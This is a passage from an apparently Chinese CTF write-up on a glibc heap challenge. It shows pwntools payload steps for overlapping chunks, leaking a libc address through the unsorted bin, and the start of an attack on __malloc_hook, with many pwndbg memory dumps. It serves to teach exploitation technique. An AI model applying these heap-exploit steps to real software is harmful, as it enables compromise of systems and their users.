class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; heap<br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757000</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757020</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757040</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757060</span><br>Size: <span class="hljs-number">0x21</span><br><br>Allocated chunk<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x00</span><br><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶çš„å†…å­˜ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>æ­¤æ—¶çš„ç»“æ„ä½“çŠ¶å†µï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1ï¼ˆchunk_flagæ”¹å˜ï¼‰</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span><br>                <span class="hljs-comment">#chunk_content_sizeï¼ˆæ”¹å˜ï¼‰   #chunk_data_ptrï¼ˆæ”¹å˜ï¼‰     </span><br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2ï¼ˆchunk_flagæ”¹å˜ï¼‰  #chunk_data_sizeï¼ˆæ”¹å˜ï¼‰     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#chunk_data_ptrï¼ˆæ”¹å˜ï¼‰  #index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000080</span><br>    <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></tbody></table></figure><p>æ³¨æ„ï¼Œæ­¤æ—¶æˆ‘ä»¬æœ‰ä¸¤ä¸ªåœ°æ–¹æŒ‡å‘index4ï¼š<br><strong>index4çš„contentæŒ‡é’ˆ</strong>ï¼ˆç¨‹åºçš„æ­£å¸¸æŒ‡å‘ï¼‰<br><strong>index2çš„contentæŒ‡é’ˆ</strong> ï¼ˆé€šè¿‡æ‰§è¡Œpayloadä¸­mallocä¹‹åçš„æŒ‡å‘ï¼Œå‚ç…§ä¸Šæ–¹ä»£ç æ¡†ä¸­çš„ç»“æ„ä½“ï¼‰<br>ç¬¬äºŒä¸ªmallocå¾—åˆ°çš„æ˜¯indexä¸º2çš„chunkï¼Œè¿™ä¸ç¨‹åºä¸­çš„Allocateå‡½æ•°æœ‰å…³ï¼Œå¯ä»¥å›é¡¾ä¸€ä¸‹å‰é¢çš„IDAä»£ç ã€‚<br>ä¹Ÿå°±æ˜¯è¯´å‡å¦‚æˆ‘ä»¬ç°åœ¨è¦fill index2çš„å†…å®¹ï¼Œé‚£ä¹ˆå…¶å®ä¸Šæ˜¯ä¿®æ”¹index4çš„å†…å®¹ã€‚</p><h4 id="1-7-ä¿®æ”¹-index4-çš„-size-ä¸º0x91"><a href="#1-7-ä¿®æ”¹-index4-çš„-size-ä¸º0x91" class="headerlink" title="1-7 ä¿®æ”¹ index4 çš„ size ä¸º0x91"></a>1-7 ä¿®æ”¹ index4 çš„ size ä¸º0x91</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ä¸ºäº†è®©index4èƒ½å¤Ÿè¢«æ”¾åˆ°unsortedbinä¸­,è¦æŠŠå®ƒçš„å¤§å°æ”¹å›æ¥</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>payload += p64(<span class="hljs-number">0x91</span>)<br>fill(<span class="hljs-number">3</span>, payload)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/50gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020ef1</span> <span class="hljs-comment">#top_chunk</span><br><span class="hljs-number">0x555555757120</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757180</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ç¨‹åºç»“æ„ä½“æœªå‘ç”Ÿå˜åŒ–</p><h4 id="1-8-ç”³è¯·æ–°å †å—-index-5"><a href="#1-8-ç”³è¯·æ–°å †å—-index-5" class="headerlink" title="1-8 ç”³è¯·æ–°å †å— index 5"></a>1-8 ç”³è¯·æ–°å †å— index 5</h4><p>ç›®çš„åªæ˜¯ä¸ºäº†é˜²æ­¢ index4 é‡Šæ”¾åä¸ top chunk åˆå¹¶</p><h4 id="1-9-free-index4-ï¼Œindex4-æ”¾å…¥-unsorted-bin-ä¸­"><a href="#1-9-free-index4-ï¼Œindex4-æ”¾å…¥-unsorted-bin-ä¸­" class="headerlink" title="1-9 free(index4)ï¼Œindex4 æ”¾å…¥ unsorted bin ä¸­"></a>1-9 free(index4)ï¼Œindex4 æ”¾å…¥ unsorted bin ä¸­</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#è¿™æ—¶å€™freeå°±ä¼šæŠŠindex4æ”¾åˆ°unsortedä¸­äº†</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">Free chunk (unsortedbin) | PREV_INUSE<br>Addr: <span class="hljs-number">0x555555757080</span><br>Size: <span class="hljs-number">0x91</span><br>fd: <span class="hljs-number">0x00</span><br>bk: <span class="hljs-number">0x7ffff7dd1b78</span><br><br>pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000091</span> <span class="hljs-comment">#index4ï¼ˆunsortedbinï¼‰</span><br><span class="hljs-number">0x555555757090</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index5</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><p>å½“unsortedbiné‡Œåªæœ‰ä¸€ä¸ªç©ºé—²çš„chunkæ—¶ï¼Œè¯¥chunkçš„fdå’ŒbkæŒ‡é’ˆå‡æŒ‡å‘unsortedbinæœ¬èº«ï¼Œè¿™ä¸ªå¯ä»¥å‚è€ƒCTF-wikiä¸­çš„å†…å®¹ï¼Œè¿™é‡Œå…ˆä¸ç»†è¯´ã€‚</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">0x5fcead98730</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>    <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x5fcead98740</span>:<span class="hljs-number">0x0000555555757010</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x5fcead98750</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757050</span>    <br><span class="hljs-number">0x5fcead98760</span>:<span class="hljs-number">0x0000000000000001</span><span class="hljs-number">0x0000000000000010</span><br>     <span class="hljs-comment">#index2     </span><br><span class="hljs-number">0x5fcead98770</span>:<span class="hljs-number">0x0000555555757090</span><span class="hljs-number">0x0000000000000001</span><br>        <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x5fcead98780</span>:<span class="hljs-number">0x0000000000000010</span><span class="hljs-number">0x0000555555757070</span><br><span class="hljs-number">0x5fcead98790</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>    <span class="hljs-comment">#index4ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰#ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰     </span><br><span class="hljs-number">0x5fcead987a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000001</span><br>    <span class="hljs-comment">#ï¼ˆæ­¤å¤„å‘ç”Ÿäº†æ”¹å˜ï¼‰   #index5</span><br><span class="hljs-number">0x5fcead987b0</span>:<span class="hljs-number">0x0000000000000080</span><span class="hljs-number">0x0000555555757120</span><br></code></pre></td></tr></tbody></table></figure><h4 id="1-10-è®¡ç®—libcåŸºå€"><a href="#1-10-è®¡ç®—libcåŸºå€" class="headerlink" title="1-10 è®¡ç®—libcåŸºå€"></a>1-10 è®¡ç®—libcåŸºå€</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">-----------------------------------------------------------------------------<br>è¿˜å¯ä»¥ç›´æ¥è¿™æ ·å†™<br>libc_base = u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))-<span class="hljs-number">0x3c4b78</span><br>-----------------------------------------------------------------------------<br>ç¤ºä¾‹payloadçš„å†™æ³•ï¼š<br><span class="hljs-comment">#å› ä¸ºindex2æ˜¯æŒ‡å‘index4çš„ï¼Œæ‰€ä»¥ç›´æ¥æŠŠindex2ç»™dumpä¸€ä¸‹å°±èƒ½æ‹¿åˆ°index4ä¸­å‰ä¸€éƒ¨åˆ†çš„å†…å®¹äº†</span><br><span class="hljs-comment">#main_arenaä¸libcåç§»ä¸º0x3c4b20(é™„ä»¶ä¸­æœ‰å·¥å…·)</span><br><span class="hljs-comment">#å†åŠ ä¸Šmain_arenaä¸unsortedbinçš„åç§»,å¾—åˆ°unsortedbinsä¸libcçš„åç§»</span><br>unsorted_offset_mainarena=unsorted_offset_arena(<span class="hljs-number">5</span>)<span class="hljs-comment">#è¿™å‡½æ•°è¿˜ä¸å¤ªæ˜ç™½</span><br>unsorted_addr=u64(dump(<span class="hljs-number">2</span>)[:<span class="hljs-number">8</span>].strip().ljust(<span class="hljs-number">8</span>, <span class="hljs-string">"\x00"</span>))<br>libc_base=unsorted_addr-<span class="hljs-number">0x3c4b20</span>-unsorted_offset_mainarena<br>log.info(<span class="hljs-string">"libc_base: "</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unsorted_offset_arena</span>(<span class="hljs-params">idx</span>):<br>    word_bytes = context.word_size / <span class="hljs-number">8</span><br>    offset = <span class="hljs-number">4</span>  <span class="hljs-comment"># lock</span><br>    offset += <span class="hljs-number">4</span>  <span class="hljs-comment"># flags</span><br>    offset += word_bytes * <span class="hljs-number">10</span>  <span class="hljs-comment"># offset fastbin</span><br>    offset += word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># top,last_remainder</span><br>    offset += idx * <span class="hljs-number">2</span> * word_bytes  <span class="hljs-comment"># idx</span><br>    offset -= word_bytes * <span class="hljs-number">2</span>  <span class="hljs-comment"># bin overlap</span><br>    <span class="hljs-keyword">return</span> offset<br>-----------------------------------------------------------------------------<br></code></pre></td></tr></tbody></table></figure><h3 id="2-æ§åˆ¶-malloc-hook"><a href="#2-æ§åˆ¶-malloc-hook" class="headerlink" title="2. æ§åˆ¶_malloc_hook"></a>2. æ§åˆ¶_malloc_hook</h3><h4 id="2-1-ç”³è¯·-unsorted-bin-ä¸­çš„-chunk"><a href="#2-1-ç”³è¯·-unsorted-bin-ä¸­çš„-chunk" class="headerlink" title="2-1 ç”³è¯· unsorted bin ä¸­çš„ chunk"></a>2-1 ç”³è¯· unsorted bin ä¸­çš„ chunk</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">alloc(<span class="hljs-number">0x60</span>)<br></code></pre></td></tr></tbody></table></figure><p>ç”±äºåœ¨ç”³è¯·ç©ºé—´ä¹‹å‰ï¼Œä¹‹åunsortedbinä¸­æœ‰ç©ºé—²çš„ç©ºé—´ï¼Œå› æ­¤ç”³è¯·ç©ºé—´ä¹‹åä¼šä½¿ç”¨unsortedbinä¸­çš„chunkã€‚<br>çœ‹ä¸€ä¸‹æ­¤æ—¶çš„å †å†…å­˜ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/60gx <span class="hljs-number">0x555555757000</span><br><span class="hljs-number">0x555555757000</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index0</span><br><span class="hljs-number">0x555555757010</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757020</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index1</span><br><span class="hljs-number">0x555555757030</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757040</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index2</span><br><span class="hljs-number">0x555555757050</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757060</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index3</span><br><span class="hljs-number">0x555555757070</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x555555757080</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000071</span> <span class="hljs-comment">#index4(ç”±unsortedbinåˆ†è£‚)</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557570f0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000021</span> <span class="hljs-comment">#index5(ç”±unsortedbinåˆ†è£‚)</span><br><span class="hljs-number">0x555555757100</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x00007ffff7dd1b78</span><br><span class="hljs-number">0x555555757110</span>:<span class="hljs-number">0x0000000000000020</span><span class="hljs-number">0x0000000000000090</span> <span class="hljs-comment">#index6ï¼ˆåŸindex5ï¼‰</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571a0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000020e61</span> <span class="hljs-comment">#top_chunk</span><br>.....ï¼ˆçœç•¥å†…å®¹å‡ä¸ºç©ºï¼‰<br><span class="hljs-number">0x5555557571d0</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><p>ä»ä¸Šé¢çš„å †æƒ…å†µå¯ä»¥çœ‹åˆ°ï¼Œç”±äºæ˜¯malloc(0x60)ï¼Œè€ŒåŸunsortedbinä¸­çš„chunk_sizeè¿‡å¤§ï¼Œå› æ­¤unsortedbinä¸­çš„chunkä¼šåˆ©ç”¨å¹¶åˆ†è£‚æˆä¸¤ä¸ªå †å—ï¼Œå…¶ä¸­index5è¿˜æ˜¯å­˜æ”¾åœ¨unsortedbinä¸­çš„ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x5555557570f0</span> â€”â–¸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) â—‚â€” <span class="hljs-number">0x5555557570f0</span><br>BK: <span class="hljs-number">0x5555557570f0</span> â—‚â€” <span class="hljs-number">0x90</span><br>----------------------------------------------------------------------<br>æ‰§è¡Œpayloadå‰ï¼š<br>unsortedbin<br><span class="hljs-built_in">all</span> [corrupted]<br>FD: <span class="hljs-number">0x555555757080</span> â—‚â€” <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x555555757080</span> â€”â–¸ <span class="hljs-number">0x7ffff7dd1b78</span> (main_arena+<span class="hljs-number">88</span>) â—‚â€” <span class="hljs-number">0x555555757080</span><br>----------------------------------------------------------------------<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt; <br></code></pre></td></tr></tbody></table></figure><h4 id="2-2-free-index4"><a href="#2-2-free-index4" class="headerlink" title="2-2 free(index4)"></a>2-2 free(index4)</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#index2_contentæŒ‡é’ˆè¿˜æ˜¯æŒ‡å‘index4_chunk_data</span><br><span class="hljs-comment">#ä¸ºäº†ä¿®æ”¹ä¹‹åindex4çš„fdæŒ‡é’ˆï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆé‡Šæ”¾index4</span><br>free(<span class="hljs-number">4</span>)<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; <span class="hljs-built_in">bin</span><br>fastbins<br><span class="hljs-number">0x20</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x30</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x40</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x50</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x60</span>: <span class="hljs-number">0x0</span><br><span class="hljs-number">0x70</span>: <span class="hljs-number">0x555555757080</span> â—‚â€” <span class="hljs-number">0x0</span><br><span class="hljs-number">0x80</span>: <span class="hljs-number">0x0</span><br>unsortedbin ï¼ˆè¿™é‡Œæ˜¾ç¤ºä¸å‡†ç¡®ï¼‰<br><span class="hljs-built_in">all</span>: <span class="hljs-number">0x0</span><br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br></code></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 